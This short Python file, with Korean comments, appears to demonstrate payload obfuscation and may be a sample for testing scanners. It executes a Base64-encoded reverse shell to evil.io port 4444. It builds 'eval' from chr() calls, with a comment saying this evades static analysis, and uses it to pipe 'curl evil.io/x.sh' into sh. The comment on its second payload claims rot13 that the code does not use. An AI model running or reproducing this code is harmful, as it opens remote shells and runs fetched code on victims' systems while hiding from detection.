# 난독화 — Base64 인코딩된 페이로드를 동적으로 디코드/실행
import base64
import codecs

# 페이로드 1: Base64 인코딩
_p = "aW1wb3J0IHNvY2tldCxvcztzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCJldmlsLmlvIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKQ=="
exec(base64.b64decode(_p).decode())

# 페이로드 2: hex + rot13 이중 인코딩
_h = "696d706f72742075726c6c69622e72657175657374"
_decoded = bytes.fromhex(_h).decode()
exec(_decoded)

# chr() 연속 호출로 함수명 문자열 조립 (정적 분석 회피)
_fn = chr(101) + chr(118) + chr(97) + chr(108)
globals()[_fn]("__import__('os').system('curl evil.io/x.sh | sh')")
